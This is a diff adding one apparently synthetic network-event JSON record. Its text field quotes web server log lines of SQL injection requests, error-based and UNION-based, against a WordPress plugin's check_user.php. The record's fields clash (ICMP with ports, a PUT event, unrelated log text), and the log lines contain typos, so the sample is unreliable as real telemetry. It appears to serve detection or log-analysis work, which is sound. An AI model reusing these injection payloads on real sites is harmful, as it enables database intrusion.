@@ -1,0 +1,14 @@
+{
+    "event_type": "PUT",
+    "ip_src": "58.8.206.94",
+    "ip_dst": "11.65.223.0",
+    "port_src": "22",
+    "port_dst": "27017",
+    "ip_proto": "ICMP",
+    "timestamp_start": "2024-04-17 21:34:13.492868",
+    "timestamp_end": "2024-04-17 21:34:14.492868",
+    "packets": 60,
+    "bytes": 154,
+    "writer_id": "eni-0207167d5649b91b2",
+    "text": "84.55.41.57- - [14/Apr/2023:08:22:13 0100] \"GET /wordpress/wp- content/plugins/custom_plugin/check_user.php?userid=1 AND (SELECT 6810 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(6810=6810,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA CHARACTER_SETS GROUP BY x)a) HTTP/1.1\" 200 166 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (NET CLR 3.5.30729)\" 84.55.41.57- - [14/Apr/2023:08:22:13 0100] \"GET /wordpress/wp- content/plugins/custom_plugin/check_user.php?userid=(SELECT 7505 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(7505=7505,1))),0×71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA CHARACTER_SETS GROUP BY x)a) HTTP/1.1\" 200 166 \"-** \"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (NET CLR 3.5.30729)\" 84.55.41.57- - [14/Apr/2023:08:22:13 0100] \"GET /wordpress/wp- content/plugins/custom_plugin/check_user.php?userid=(SELECT CONCAT(0x7171787671, (SELECT (ELT(1399=1399,1))),0×71707a7871)) HTTP/11\" 200 166 \"_\" \"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\" 84.55.41.57- - [14/Apr/2023:08:22:27 0100] \"GET /wordpress/wp- content/plugins/custom_plugin/check_user.php?userid=1 UNION ALL SELECT CONCAT(0x7171787671,0x537653544175467a724f,0x71707a7871),NULL,NULL-- HTTP/1.1\" 200 182 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (NET CL R3.5.30729)\""
+}
